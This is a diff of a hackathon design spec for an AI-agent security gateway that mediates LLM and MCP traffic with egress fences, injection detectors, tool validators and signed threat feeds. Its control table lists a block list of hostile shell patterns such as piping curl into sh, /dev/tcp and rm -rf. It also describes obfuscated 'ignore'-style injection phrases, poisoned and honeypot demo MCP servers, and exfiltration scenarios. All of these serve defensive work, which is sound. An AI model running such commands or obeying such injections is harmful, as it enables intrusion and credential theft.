@@ -1,9 +1,23 @@
 # VISION-SPEC: **Mandate** (working name), the canonical build spec
 
 > **Event:** HackYeah 2026, Kraków, Goldman Sachs partner task "AI Control Layer" (~24 h, 6 Python developers, Apple Silicon laptops with 32 GB+).
-> **Status:** **CANONICAL.** This document replaces proposals P1-P5 as the contract the team builds from. If a proposal, a research note or the dashboard brief disagrees with this file, this file wins. Where a research note disagrees with `research/FACT-CHECK.md`, the fact-check wins.
+> **Status:** **CANONICAL, v1.1.** This document replaces proposals P1-P5 as the contract the team builds from. If a proposal, a research note or the dashboard brief disagrees with this file, this file wins. Where a research note disagrees with `research/FACT-CHECK.md`, the fact-check wins.
 > **Change control:** the sections marked **FROZEN AT H1** (§5.7 wire contract, §6 policy schema, §9.1 audit event, §11 API, §10.3 case format) change after H1 only through a one-paragraph RFC in the team chat, the lead's approval and a version bump.
 > **Inputs:** `design/proposals/P1`-`P5`; `design/judging/J1-gs-appsec-lead.md`, `J2-gs-platform-architect.md`, `J3-hackathon-mentor.md`; `research/R1`-`R9` and `research/FACT-CHECK.md`; `docs/00`-`02` and `docs/dashboard-design-brief.md`; `examples/` (audit schema, feed, test cases, agent configs). Citations use file names.
+
+> **Changelog. v1.1 (2026-10-03 17:30 CEST):**
+> - **Clock re-baselined:** H0 = the moment the team starts building, after the kickoff. §13.4 maps the plan to both possible deadlines. Plan (a) (11:00 Oct 4: P0 only, freeze H11, submit H15) runs until Q2 is confirmed.
+> - **Capacity fixed:** P0 = 79.5 h against 81 h (6 × 13.5 h), and no lane is above 13.5 h. Moved: mutators → P1 #8; scripted-agent CLI L8 → D6; `/api/policy/history` L6 → B7; `make doctor/warm` C7 → L8; `tools/seed.py` → C8; `tools/mint_jwt.py` → A3; Ollama-native mock → P1 #11; `/api/feed` → P1 #6; `package_ioc` → P1 #17; F7 is a table + Run button (1.0 h).
+> - **Ordering fixed:** B6 (C07) is due H9:30, before B5 (signed feed, now H12:30). IC3 runs on the dev feed bundle. D3a builds against the frozen `detector.py` plus B's rule-engine stub, and the guard stub and dev feed bundle land by H4.5 for IC1. Threats rows go live over SSE at IC1, with the DuckDB-backed filters and drawer data following at H8:30. The Playground at IC3 runs on fixtures plus one live call.
+> - **Owners added:** C20 rules → B, with the call-site hook → D (D3b). Gateway guard client → C (C3). C12: A owns the mechanics and URL extraction, B owns the rule packs and allowlist semantics. Tool units: C owns the ledger unit, D wires the per-tool `cost_units`. R22 → L / B.
+> - **Tiers made consistent:** GGUF template scan, the `window` view and ROT13, SIG-0011 `tool_sequence`, the Policy diff and Audit query pages, server-side role stripping, `models.*.fallback`, C11 on LLM-out and MNPI route-local are now **P2**.
+> - **Setup gaps closed (§13.8, §3.4):** an `aicl-pybase` image at H1; shadcn `dashboard-01` generated while online; exFAT USB sticks; Docker Model Runner off or probed; the fence probe also tests by raw host IP.
+> - **Small fixes:** `frameworks.yaml` has its format frozen at H1 and its content filled by H13. Contracts are drafted as text and schema only, with code from H0, and Q16 asks the organisers about pre-event design. `facts_flaky` was added for S8 and beat 9. The sleep plan is fixed: L naps H18:00-H19:30 and stays for the rehearsals. The missing F4 is explained.
+> - **Naming:** in Polish, *mandat* also means a traffic fine. Polish texts say *pełnomocnictwa*, and the team decides consciously at H11.
+> - **ReDoS demo corrected:** RE2 accepts `(a+)+$` and runs it in linear time. A non-RE2 pattern (lookaround, backreference) is the input that gets rejected, and the line for judges is "ReDoS can't happen here".
+> - **Feed schema:** the match fields the examples use (`extract`, `host_not_in`, `json_field`, `not_regex`, `query_has`, `field`, `topics`, `exemplar_groups`, …) and `metadata.tier` are defined in §8.1/§8.4.
+> - **Case and audit schemas:** `expect.headers` is added and the field name `by_profile` is noted (§10.3). §9.1 now lists the per-control verdict `flag`, the budget scope prefixes and a top-level `synthetic`.
+> - **Gantt:** re-timed to match the tables, with `todayMarker off`.
 
 ---
 
@@ -36,12 +50,14 @@
    - a policy-aware live self-test that reports GAP (amber), not FAIL, when a judge disables a control;
    - held-out efficacy numbers shown next to the self-graded ones (P1).
 7. **Scope is honest.**
-   - P0 is about **82 person-hours**, roughly 85% of the ~96 build hours available. Backend lanes carry 12.5-14.5 h and the single UI lane 12.5 h.
+   - P0 is about **79.5 person-hours** = 13.5 (L) + 13.5 (A) + 13.5 (B) + 13.5 (C) + 13.5 (D) + 12.0 (F), against 6 × 13.5 = 81 h of feature time (H1-H16 minus ~1.5 h of meals): about 98%. No lane carries more than 13.5 h; the IC4 flag-off rule, not slack, absorbs any overrun.
    - The console has **4 P0 pages plus a header**; spend is a P0 panel on Overview, and the full Spend page is P1.
    - The H12 gate has an explicit critical path (§13.2). P0 completes at **IC4 (H15)**.
    - P1 is a ranked list behind feature flags, started only on green lanes.
    - Every graft from the judges' memos is paid for by a named cut (§16, Appendix A).
 8. **Not built at P0:** Squid (fork or stock), Keycloak/LDAP live, the A2A proxy, call warrants, a separate sparring service, compiler emitters, the HF scanning mirror, four-eyes approvals, the Anthropic dialect, a second test harness, an 11-page console. Each one is either a slide or a ranked P1/P2 item.
+
+**Clock (v1.1).** H0 is the moment the team starts building after the kickoff (about 18:00 on 3 October), not the official start. §13.4 maps the plan to both possible deadlines. If the deadline is 11:00 on 4 October, a compressed P0-only plan runs (freeze H11, submit H15), and this is the default until Q2 is confirmed. If it is 23:00 on 4 October, this plan runs with about 5 h of buffer.
 
 **Priority tiers.**
 - **P0** must be green by **IC4 (H15)**. If it is red, its flag is turned off and it leaves the pitch. The **H12-gate items** must already be green at IC3 (H12): C13 fence, C24/C33 taint + provenance, C35 admin isolation, the detectors-off test and the cross-replica race.
@@ -64,7 +80,7 @@
 
 | # | Name | Why it fits | Risk |
 |---|---|---|---|
-| 1 | **Mandate** | The pitch line is "agents get mandates, not keys". In a bank, a mandate is delegated, bounded authority. It names the product's guarantee, not its plumbing. | Common word. We found no AI-security product that uses it as an obvious mark (team to re-check at H0) |
+| 1 | **Mandate** | The pitch line is "agents get mandates, not keys". In a bank, a mandate is delegated, bounded authority. It names the product's guarantee, not its plumbing. | Common word. We found no AI-security product that uses it as an obvious mark (team to re-check at H0). **In everyday Polish *mandat* also means a traffic fine** (*mandat karny*), so Polish judges may hear "agents get fined". Polish texts therefore use ***pełnomocnictwa*** ("agenci dostają pełnomocnictwa, nie klucze"). The team decides consciously at H11 |
 | 2 | Remit | "Acting within remit" means scope of authority | Sounds like payments/remittance, which is confusing next to budgets |
 | 3 | Writ | A formal order that authorises an act. Short | Easy to mishear on stage ("rit") |
 | 4 | Countersign | Four-eyes vocabulary that bankers know | Long. It implies approvals, which are P1 |
@@ -166,20 +182,20 @@ Sources: `docs/01` §6, R3 key findings, R5, R7, FACT-CHECK B4/D2/D3. Vendor fea
 4. **The control plane is a separate service.** `control` owns everything that is not enforcement: the report API (DuckDB over the audit volume), the SSE hub, the live self-test, posture and coverage, signed audit checkpoints, exports, the Playground and the console SPA. Agents have no route to it. If `control` dies, the data plane keeps enforcing and auditing.
 5. **The enforcement process never executes tool code.** MCP servers run in sandbox containers with no egress and are reached over Streamable HTTP from the registry only. The agent's `Authorization` is stripped and a per-backend credential is injected (no token passthrough, R6 §2.6).
 6. **Keep the event loop clean.** ONNX inference runs in `guard` (a process pool). DuckDB, exports and checkpoint hashing run in `control`. The gateway does RE2, Aho-Corasick, dictionary lookups and Valkey round trips; audit hashing runs on a background task.
-7. **Offline-first and deterministic by default.** `mock-llm` speaks the OpenAI dialect and the Ollama native API, and serves simulated priced models. The scripted agent replays S1-S8. `make demo-offline` runs the whole product with no model. Ollama runs natively on the Mac (Metal) and is optional.
+7. **Offline-first and deterministic by default.** `mock-llm` speaks the OpenAI dialect (the Ollama native API is P1 #11), and serves simulated priced models. The scripted agent replays S1-S8. `make demo-offline` runs the whole product with no model. Ollama runs natively on the Mac (Metal) and is optional.
 
 ### 3.2 Components
 
 | # | Component | Responsibility | Tech (licence) | Networks | Owner |
 |---|---|---|---|---|---|
 | 1 | **`lb`** | The only host agents can reach. Round-robins `/v1/*` and `/mcp/*` to `gw-1`/`gw-2`, with SSE flushing on (`flush_interval -1`) and no buffering. Exposes no admin routes. Hashes on `Mcp-Session-Id` for legacy MCP clients | Caddy 2 (Apache-2.0) | agents, edge (127.0.0.1:8080), core | A |
-| 2 | **`gateway`** ×2 (`gw-1`, `gw-2`) | Data plane. OpenAI `/v1/chat/completions` (stream + tools), `/v1/models`, `/v1/me`, `/v1/runs`, `/mcp/{server}`, `/v1/artifacts/scan`. Holds the T0/T1 pipeline, stream holdback, tool-call mediation, run tokens/taint/provenance, Valkey reserve/settle, feed client, per-replica audit writer and policy hot reload. Metrics and internal state are on a separate listener (`:9090`, core only) | Python 3.12, FastAPI 0.142, uvicorn+uvloop, httpx, pydantic v2 (`extra="forbid"`), ruamel.yaml, watchfiles, google-re2, pyahocorasick, sqlglot, jsonschema, rfc8785, PyJWT, cryptography, valkey-py, prometheus-client; FastMCP 4.0.10 *or* a thin JSON-RPC proxy (decided at H2.5) (all MIT/BSD/Apache-2.0) | core, sandbox, upstream | A (core, streaming, identity), B (detectors, feed client, audit), C (budget client), D (MCP edge, tools, taint) |
+| 2 | **`gateway`** ×2 (`gw-1`, `gw-2`) | Data plane. OpenAI `/v1/chat/completions` (stream + tools), `/v1/models`, `/v1/me`, `/v1/runs`, `/mcp/{server}`, `/v1/artifacts/scan`. Holds the T0/T1 pipeline, stream holdback, tool-call mediation, run tokens/taint/provenance, Valkey reserve/settle, feed client, per-replica audit writer and policy hot reload. Metrics and internal state are on a separate listener (`:9090`, core only) | Python 3.12, FastAPI 0.142, uvicorn+uvloop, httpx, pydantic v2 (`extra="forbid"`), ruamel.yaml, watchfiles, google-re2, pyahocorasick, sqlglot, jsonschema, rfc8785, PyJWT, cryptography, valkey-py, prometheus-client; FastMCP 4.0.10 *or* a thin JSON-RPC proxy (decided at H2.5) (all MIT/BSD/Apache-2.0) | core, sandbox, upstream | A (core, streaming, identity), B (detectors, feed client, audit), C (budget client, guard client), D (MCP edge, tools, taint) |
 | 3 | **`guard`** | Semantic tier-1. `POST /v1/inspect` runs the injection classifier over **sliding windows** (batched in one ONNX call) and the multilingual kNN over feed `semantic` exemplars (EN+PL injection, jailbreak and harm categories). Process pool. `GUARD_ENGINE=stub` gives deterministic marker-driven scores for `make test` | onnxruntime (MIT), tokenizers (Apache-2.0); **default** `protectai/deberta-v3-base-prompt-injection-v2` INT8 (Apache-2.0, ungated, EN only, baked into the image); **optional** Llama Prompt Guard 2 86M INT8 (Llama 4 Community Licence, text-only so fine for an EU team, gated; used on demo laptops when present); `paraphrase-multilingual-MiniLM-L12-v2` INT8 (Apache-2.0) for kNN | core | C |
-| 4 | **`control`** | Control plane and console. Report API (DuckDB `read_json` over the per-replica JSONL), SSE hub (tails the audit files), live policy-aware self-test (sends traffic **through `lb` as `svc-selftest`**), posture and coverage, policy history and diff, **signed checkpoints** of every chain head (Ed25519 key held only here; written to the `witness` volume), integrity verify, exports, the Playground (sends **through the data plane as a real demo principal**), health aggregation and its own audit chain for admin actions. Admin bearer token on every route | FastAPI, DuckDB (MIT), rfc8785, cryptography; serves the SPA build | admin (127.0.0.1:3000), core | L (skeleton, SSE, self-test, posture, Playground), B (threat/event/KPI queries, integrity, exports, checkpoints), C (spend queries) |
+| 4 | **`control`** | Control plane and console. Report API (DuckDB `read_json` over the per-replica JSONL), SSE hub (tails the audit files), live policy-aware self-test (sends traffic **through `lb` as `svc-selftest`**), posture and coverage, policy history and diff, **signed checkpoints** of every chain head (Ed25519 key held only here; written to the `witness` volume), integrity verify, exports, the Playground (sends **through the data plane as a real demo principal**), health aggregation and its own audit chain for admin actions. Admin bearer token on every route | FastAPI, DuckDB (MIT), rfc8785, cryptography; serves the SPA build | admin (127.0.0.1:3000), core | L (skeleton, SSE, self-test, posture, Playground), B (threat/event/KPI/policy-history queries, integrity, exports, checkpoints), C (spend queries) |
 | 5 | **console SPA** | 4 P0 pages + global header, with spend as an Overview panel (§9.5); SSE with a 2 s polling fallback; fixtures mode (`VITE_API=fixtures\|live`) | React 19, Vite 8, Tailwind 4, shadcn `dashboard-01`, Recharts 3, TanStack Query (all MIT) | served by `control` | F |
 | 6 | **`feed`** | The "externally managed" threat-intel service. Holds the **Ed25519 private key**. `feedctl publish` (explicit step, never on file save) validates, bumps the serial, signs and serves `GET /bundle` with an ETag | FastAPI, cryptography | core (+ 127.0.0.1:9000 read-only) | B |
 | 7 | **`valkey`** | Budgets (Lua reserve/settle), concurrency leases, rate counters, runs and taint, destination sets, MCP pins and quarantine records, policy version map, replica heartbeats, feed `last_serial` per key, approvals (P1). `requirepass` + ACL users `gw` and `control`; `default` user disabled; AOF on a volume | `valkey/valkey:8` (BSD-3) | core | C |
-| 8 | **`mock-llm`** | Deterministic upstream. OpenAI chat (SSE), Ollama native `/api/chat`, priced `sim/*` aliases (labelled simulated), `[[mock:...]]` directives (reply, tool_call, usage, latency, stream, error), `/_mock/calls` so tests can prove blocked content never reached upstream | FastAPI | upstream | A |
+| 8 | **`mock-llm`** | Deterministic upstream. OpenAI chat (SSE), Ollama native `/api/chat` (P1 #11, with native durations), priced `sim/*` aliases (labelled simulated), `[[mock:...]]` directives (reply, tool_call, usage, latency, stream, error), `/_mock/calls` so tests can prove blocked content never reached upstream | FastAPI | upstream | A |
 | 9 | **`mcp-tools`** | Our trusted demo servers as Streamable HTTP MCP servers: `filesystem` (`/sandbox`), `mail` (outbox.jsonl), `bankdb` (sqlite + transfer tool), `web` (local pages incl. `ticket-42.html`), `crm` (customer lookup, `trusted_source`) | `mcp` SDK 2.3 `MCPServer` (MIT) | sandbox (no egress) | D |
 | 10 | **`mcp-untrusted`** | Hostile demo servers: `facts` (poisoned v2 / rug pull toggled by `make demo-rugpull`), `vault` (honeypot `admin_get_credentials`) | same | sandbox | D |
 | 11 | **`demo-agent`** | `support-bot`. Scripted mode (S1-S8, no LLM, the default) and live mode (`qwen3:8b` via the gateway, P1). Uses the `aicl_demo.agent` library, which `control` also uses for scenario replay (P1) | openai SDK, mcp client | agents | D |
@@ -225,7 +241,7 @@ flowchart LR
   end
 
   subgraph UPS["network upstream (bridge)"]
-    MK["mock-llm<br/>OpenAI SSE + Ollama native<br/>sim/* priced aliases"]
+    MK["mock-llm<br/>OpenAI SSE + Ollama native (P1)<br/>sim/* priced aliases"]
   end
 
   AUD[("volume audit<br/>gw-1 and gw-2 JSONL chains")]
@@ -264,8 +280,8 @@ flowchart LR
 
 **Proof:** `tests/fence/test_bypass.py` runs `fence-probe` and asserts every ❌ in the agent row, including `GET /admin/*` and `GET /api/*` on `lb` (both 404). It runs at H1 on every demo Mac and in every `make test`.
 
-**H1 macOS probe and fallback ladder** (J2 X10, J3 must-fix 3). Whether `host.docker.internal` is unreachable from an `internal: true` network on Docker Desktop is **unverified**. If the probe leaks:
-1. Add `extra_hosts: ["host.docker.internal:0.0.0.0", "gateway.docker.internal:0.0.0.0"]` and `dns: [0.0.0.0]` to the agent services, then re-probe.
+**H1 macOS probe and fallback ladder** (J2 X10, J3 must-fix 3). Whether `host.docker.internal` is unreachable from an `internal: true` network on Docker Desktop is **unverified**. The probe tries every host target **by name and by raw host IP**. It also tries **Docker Model Runner** at `model-runner.docker.internal`: DMR is an unauthenticated LLM API that containers can reach, so it is disabled on demo Macs, and if anyone enables it, it becomes a probe target (FACT-CHECK A6). If the probe leaks:
+1. Add `extra_hosts: ["host.docker.internal:0.0.0.0", "gateway.docker.internal:0.0.0.0"]` and `dns: [0.0.0.0]` to the agent services, then re-probe by name **and by raw IP**. The override only renames hosts, so if the raw IP still answers, this step does not hold.
 2. Run the agent-lane Ollama on the hot-spare laptop over a direct LAN cable and point `upstreams.ollama_agent.base_url` at it (an internal network has no route to the LAN).
 3. If neither holds, **we do not claim the Ollama chokepoint**. The fence claim covers Valkey, control, guard, MCP and the internet, the probe output goes in the README, and this becomes residual T5.
 
@@ -450,7 +466,7 @@ sequenceDiagram
 | **agent → MCP** | `/mcp/{server}` (Streamable HTTP; MCP 2026-07-28 stateless, with the legacy 2025-11-25 `initialize` answered locally) | **Deep, P0** | Registry-only upstreams in sandbox containers; list filtering, pins, description scan, argument validators, result scan, taint, honeypot. C34 protocol hardening (header/body desync, batch rejection, schema-bomb limits) is **P1** |
 | **app → agent** | `POST /v1/runs` (user credential only) | **P0, the trust anchor** | The authenticated task text mints the run's trusted destinations. Returns an HMAC run token that the agent presents on every LLM and MCP call (C33) |
 | **agent → agent** | Thin: a `kyc-agent` exposed as an MCP tool; the caller's run token is forwarded so the callee **inherits taint** | **P1** | A signed A2A proxy (C21) is P2. **ASI07 is shown as partial** |
-| model artifacts | `POST /v1/artifacts/scan`, `aicl scan <file>` | P0 lite | Allowlist-first, fail-closed (C18). HF mirror and GGUF template scan are P2/P1 |
+| model artifacts | `POST /v1/artifacts/scan`, `aicl scan <file>` | P0 lite | Allowlist-first, fail-closed (C18). HF mirror and GGUF template scan are P2 |
 
 ### 3.7 Deployment view (docker compose)
 
@@ -506,7 +522,7 @@ aicl/                                  # hackathon repo (Apache-2.0)
   CLAUDE.md  Makefile  pyproject.toml  uv.lock  LICENSE  NOTICE ("Built with Llama" if PG2/LG3 ship)
   contracts/                           # FROZEN AT H1, CODEOWNERS: lead
     policy.schema.json  audit-event.schema.json  feed-bundle.schema.json  case.schema.json
-    frameworks.yaml                    # framework item -> required/supporting controls (from R1 §10)
+    frameworks.yaml                    # framework item -> required/supporting controls (from R1 §10); format frozen at H1, content filled by L6 (H13)
     openapi-dataplane.yaml  openapi-control.yaml  sse-events.md  errors.md
     canonical.py  detector.py  fixtures/api/*.json  fixtures/events/*.json  fixtures/stream.jsonl
   policy/policy.yaml  policy/feeds/local.yaml  policy/calibration/*.json
@@ -559,16 +575,16 @@ IDs reuse R1's `C01`-`C32` (`research/R1-threat-frameworks.md` §9). `C33`-`C36`
 | **C08** | Normaliser + **multi-view decoder** (§5.3) | DET | all text | **P0** | stdlib `unicodedata`, vendored Unicode `confusables.txt` (Unicode licence), bounded base64/hex/url decoders (depth 2, 64 KB). **Decodes** Unicode tags into readable text for the trace | strip invisible chars (modify) + scan all views | LLM01:2026 · AML.T0068 · AML.T0123 |
 | **C09** | Injection & jailbreak signatures from the feed, EN+PL | DET | LLM-in, MCP-res, MCP-list | **P0** | Feed `regex` (RE2) + `keyword` (pyahocorasick) over every view; severity → action | block | LLM01:2026 · ASI01 · AML.T0051.000 · AML.T0054 |
 | **C10** | Semantic injection detection. Detectors: `pi-classifier` (windowed) + `knn-pi` (multilingual exemplars) | SEM | LLM-in, MCP-res, unvouched `role:tool` | **P0** | `guard`: default protectai-v2 INT8 (EN, ungated); PG2-86M INT8 (multilingual) when present; multilingual MiniLM-L12 kNN over feed `semantic` exemplars EN+PL. `adherence` → threshold (§6.4) | prompt: block ≥ `block_at`, flag + taint in the band; tool result: redact span + taint. `fail: taint` | LLM01:2026 · ASI01 · MCP06:2025 · AML.T0051.000/.001 · AML.T0054 |
-| **C11** | Content-safety & topic lane, **not gated on the injection score**. Detectors: `topic-pack` (EN+PL deterministic), `knn-harm` (multilingual exemplars), `guard-llm` (P1) | SEM + DET | LLM-in (P1: LLM-out) | **P0 floor / P1 guard-LLM** | P0: feed keyword/regex topic pack (malware creation, weapons, self-harm, **investment advice** for support agents) + harm exemplars in kNN. P1: `llama-guard3:1b` on the `:11435` lane, **in parallel with the upstream call**, gating first-token release (1.5 s deadline). Qwen3Guard-Gen-0.6B if the H0-H2 spike passes | block banned topic | ASI01 (scope) · AML.T0054 |
-| **C12** | Output channel closure: markdown/HTML/autolink URL extraction + host allowlist + query-entropy flag | DET | LLM-out (stream), MCP-res | **P0** | Structural URL extraction, run inside the trigger-aware holdback scanner (§5.5). Replaces R2's lookahead regex (not RE2-safe) with a `url_ioc` rule | strip link (strict: block) | LLM10:2026 [LLM05:2025] · LLM02:2026 · AML.T0077 |
+| **C11** | Content-safety & topic lane, **not gated on the injection score**. Detectors: `topic-pack` (EN+PL deterministic), `knn-harm` (multilingual exemplars), `guard-llm` (P1) | SEM + DET | LLM-in (P2: LLM-out) | **P0 floor / P1 guard-LLM** | P0: feed keyword/regex topic pack (malware creation, weapons, self-harm, **investment advice** for support agents) + harm exemplars in kNN. P1: `llama-guard3:1b` on the `:11435` lane, **in parallel with the upstream call**, gating first-token release (1.5 s deadline). Qwen3Guard-Gen-0.6B if the H0-H2 spike passes | block banned topic | ASI01 (scope) · AML.T0054 |
+| **C12** | Output channel closure: markdown/HTML/autolink URL extraction + host allowlist + query-entropy flag | DET | LLM-out (stream), MCP-res | **P0** | Structural URL extraction, run inside the trigger-aware holdback scanner (§5.5). Replaces R2's lookahead regex (not RE2-safe) with a `url_ioc` rule. **A** owns the streaming mechanics and URL extraction; **B** owns the rule packs and the allowlist semantics | strip link (strict: block) | LLM10:2026 [LLM05:2025] · LLM02:2026 · AML.T0077 |
 | **C13** | Egress fence = complete mediation | POL (net) | NET | **P0 · floor** | Compose `internal: true` networks + `fence-probe` (§3.4). K8s NetworkPolicy story | unreachable | MCP09:2025 · AML.T0096 · AML.T0132 |
 | **C14** | Tool mediation + argument validators, **one policy on both edges** | POL + DET | LLM-tc, MCP-call | **P0 · permission** | `aicl.tools`: allowlist per agent/group (unlisted tool = invisible + denied), L0-L5 risk ceiling, `jsonschema` args, `path` (realpath + commonpath), `ssrf` (`ipaddress` over all resolved IPs, incl. metadata and IPv4-mapped), `url_allowlist`, `sql` (sqlglot verb/table + forced `LIMIT` → `modify`), `email` (internal domains, external BCC deny), `amount`/`iban`, DLP on args (C06/C07) | deny / modify | LLM03:2026 [LLM06:2025] · ASI02 · ASI03 · MCP02:2025 · MCP07:2025 · AML.T0053 · AML.T0086 · AML.T0101 |
 | **C15** | MCP pinning (JCS sha256 of the full definition), description scan, cross-server references and name collisions, risk floors | DET | MCP-list (+ recheck on call) | **P0** | Middleware on `tools/list`; pins in Valkey; scan = C08 views + feed `tool_description` rules (SIG-0003); `{server}_{tool}` namespacing; floors (`delete_*`, `drop_*`, `transfer*` → L5); re-check at call time (defeats FastMCP's 300 s list cache, R6) | quarantine (hidden from list, call denied) | MCP03:2025 · MCP02:2025 · ASI04 · LLM04:2026 · AML.T0110.000 · AML.T0109 |
 | **C16** | Tool-result & retrieved-content scan + **taint source** | DET + SEM | MCP-res, LLM `role:tool` | **P0** | C08 + C09 + C10 + C06/C07 on every string leaf; injected span redacted with a notice. **Always** taints a run on `untrusted_source` (label-based, detector-independent). Datamark spotlighting is P1 | redact span + taint. `fail: taint` | LLM01:2026 · ASI01 · MCP06:2025 · AML.T0051.001 · AML.T0110.002 |
 | **C17** | Command/code guard | DET | MCP-call, LLM-tc | **P0** | Feed regex pack only (`curl … \| sh`, `/dev/tcp/`, `pickle.loads`, `eval(`, `os.system`, `rm -rf /`); no shlex parser at P0 | deny | ASI05 · MCP05:2025 · LLM10:2026 · AML.T0050 · AML.T0102 |
-| **C18** | Model artifact gate, allowlist-first and **fail-closed** | DET | ART | **P0 lite** | stdlib `pickletools.genops` walk with a safe-GLOBAL allowlist (feed `pickle_globals`); any parse error → block; torch zip `data.pkl` walk; safetensors header validation; sha256 pins + feed `hash` rules; unknown format → block. P1: GGUF `chat_template` Jinja AST scan; P2: `/hf/` mirror | block (quarantine) | LLM04:2026 [LLM03:2025] · ASI04 · ASI05 · AML.T0010.003 · AML.T0011.000 · AML.T0018.002 |
+| **C18** | Model artifact gate, allowlist-first and **fail-closed** | DET | ART | **P0 lite** | stdlib `pickletools.genops` walk with a safe-GLOBAL allowlist (feed `pickle_globals`); any parse error → block; torch zip `data.pkl` walk; safetensors header validation; sha256 pins + feed `hash` rules; unknown format → block. P2: GGUF `chat_template` scan and the `/hf/` mirror | block (quarantine) | LLM04:2026 [LLM03:2025] · ASI04 · ASI05 · AML.T0010.003 · AML.T0011.000 · AML.T0018.002 |
 | **C19** | Signed external signature feed | DET | all | **P0** | Ed25519 over JCS; serial anti-rollback **persisted per key_id** in Valkey; expiry; embedded vectors gate activation; unknown rule types skipped (§8) | per rule | LLM04:2026 · ASI04 · MCP04:2025 · AML.T0010.005 |
-| **C20** | AI-infra endpoint guard | DET + POL | MCP-call (http tools) | **P0** | Feed `http_request` rules (Ray `POST /api/jobs/`, Langflow `/api/v1/validate/code`, Ollama `/api/pull`/`/api/create`/`DELETE /api/delete`, TorchServe `/models?url=`) compiled into **hard exclusions no grant can authorise**. Hard floor: Ollama admin APIs are never proxied for agents | deny | ASI05 · AML.T0132 |
+| **C20** | AI-infra endpoint guard | DET + POL | MCP-call (http tools) | **P0** | Feed `http_request` rules (Ray `POST /api/jobs/`, Langflow `/api/v1/validate/code`, Ollama `/api/pull`/`/api/create`/`DELETE /api/delete`, TorchServe `/models?url=`) compiled into **hard exclusions no grant can authorise**. Hard floor: Ollama admin APIs are never proxied for agents. **Owners:** B (the rule packs and the floor list), D (the call-site hook in `aicl.tools`, D3b) | deny | ASI05 · AML.T0132 |
 | C21 | A2A security: signed Agent Cards, peer graph, replay cache, hop limit, taint inheritance | DET + POL | A2A | **P2** | PyJWT + rfc8785; slide + S10 test only | — | ASI07 · AML.T0118.001 · AML.T0073 |
 | C22 | Memory-write guard with provenance stamping | TAINT + SEM | MCP (memory) | **P2** | `persistent` label; tainted write → ask | — | ASI06 · AML.T0080.000 |
 | **C23** | Human approval (`ask`), retry-token bound to the args hash, single use, TTL 300 s, approver ≠ requester | POL | MCP-call, LLM-tc | **P1** (P0: `ask` = block with "approval required") | Approval records in Valkey; console card (P1); four-eyes is P2 | ask | ASI09 · LLM03:2026 · AML.T0101 |
@@ -600,7 +616,7 @@ IDs reuse R1's `C01`-`C32` (`research/R1-threat-frameworks.md` §9). `C33`-`C36`
 |---|---|
 | **LLM 2026** | Green: 01, 02, 03, 04, 06, 08, 10. Partial: 09 (via C16). Out of scope: 05 (runtime part only) and 07 |
 | **ASI** | Green: 01, 02, 03, 04, 05, 08, 10. Partial: 09 until C23 lands, 07 (thin agent→agent), 06 (P2) |
-| **MCP:2025** | Green: 01-10. MCP02 via the C15 risk ceiling, MCP04 via C19 package IOCs, MCP09 via C13 |
+| **MCP:2025** | Green: 01-10. MCP02 via the C15 risk ceiling, MCP04 via C15 pins + the signed C19 feed (package IOCs at P1 #17), MCP09 via C13 |
 | **ATLAS** | Tactic strip computed from the tagged tests |
 
 ---
@@ -663,8 +679,8 @@ Budgets are **targets to be re-measured on the demo Mac at H2** (C owns it). The
 | `nfkc` | `unicodedata.normalize("NFKC")` | fullwidth/compat forms | C06, C07, C09 |
 | `skeleton` | TR39 confusables skeleton | homoglyphs (`іgnore`), lookalike domains (`bаnk.example`) | C09, C24 spoof check |
 | `folded` | lowercase, leet fold (0→o, 1→i, 3→e, 4→a, 5→s, 7→t, @→a, $→s), **Polish diacritic fold** (ą→a, ł→l, ż→z…), separator collapse (`i g n o r e`, `i.g.n.o.r.e`) | leetspeak, letter-spacing, diacritic dodging | C09, C11 keyword packs only |
-| `decoded[]` | blobs ≥ 16 chars detected as base64/hex/url-encoding, decoded to depth ≤ 2, ≤ 64 KB total (ROT13 at P1) | "decode this and follow it" | all detectors |
-| `window` (P1) | last 3 user/tool messages concatenated | payloads split across turns | C09, C10 |
+| `decoded[]` | blobs ≥ 16 chars detected as base64/hex/url-encoding, decoded to depth ≤ 2, ≤ 64 KB total (ROT13 at P2) | "decode this and follow it" | all detectors |
+| `window` (P2) | last 3 user/tool messages concatenated | payloads split across turns | C09, C10 |
 
 **How views and windows are processed:**
 - **Deduplication:** views are deduplicated by sha256. The classifier runs only on `raw`, `tag_decoded` and `decoded[]` views that differ from `raw`. Running a classifier on `folded` text is meaningless.
@@ -708,7 +724,7 @@ Budgets are **targets to be re-measured on the demo Mac at H2** (C owns it). The
 | Policy invalid | schema, compile or vectors fail | last-known-good stays; banner shows the YAML path and error | — | header red 7 s, history row REJECTED |
 | Replicas on different policy shas | heartbeats in Valkey | alert after 10 s; each replica audits its own sha, so evidence stays correct | — | header `1/2 on v18`, amber |
 | Audit writer backpressure | `aicl_audit_queue_depth` | profile (above) | `audit.on_backpressure` | red under strict |
-| Upstream 5xx / Ollama queue full (503) | status | pass through 503 + `x-should-retry: true`; settle input only | `models.*.fallback` (P1) | upstream errors tile |
+| Upstream 5xx / Ollama queue full (503) | status | pass through 503 + `x-should-retry: true`; settle input only | `models.*.fallback` (P2) | upstream errors tile |
 | MCP server down | connect error | `isError` result, no bypass | — | tool status |
 | **control down** | — | **the data plane keeps enforcing and auditing**; checkpoints pause (health amber when control returns); console stale | — | whole header grey "stale since …" |
 | JWKS file missing or invalid | load error at reload | previous JWKS kept (cache); virtual keys keep working | — | identity amber |
@@ -717,7 +733,7 @@ Budgets are **targets to be re-measured on the demo Mac at H2** (C owns it). The
 - **Live on stage (safe):** `docker compose stop guard` → DEGRADED banner, fail-to-taint counter rising, and the S4 exfiltration is **still denied**.
 - **Recorded clips, never live:** (a) `docker compose kill gw-1` during the race test; (b) `docker compose stop valkey` → `sim/*` 503, `ollama/*` capped.
 
-### 5.5 Streaming: trigger-aware holdback (A owns the mechanics, B owns the rules)
+### 5.5 Streaming: trigger-aware holdback (A owns the mechanics and URL extraction, B owns the rule packs and allowlist semantics)
 
 - **Release rule.** For each text content block, release everything except the last `min_chars` (default **32**). **Exception:** while a *trigger* is open, hold until it terminates (whitespace, `)`, `>`, `"` or the end of a digit run) or until the held segment reaches `max_hold_chars` (1,024). Then evaluate and release.
 - **Triggers:**
@@ -886,7 +902,7 @@ identities:
       cost_centre: CC-4410
       models: ["ollama/qwen3:8b", "mock/*"]
       tools: [web_fetch, crm_get_customer, bankdb_query, bankdb_transfer, mail_send_email,
-              facts_get_fact, vault_admin_get_credentials]
+              facts_get_fact, facts_flaky, vault_admin_get_credentials]
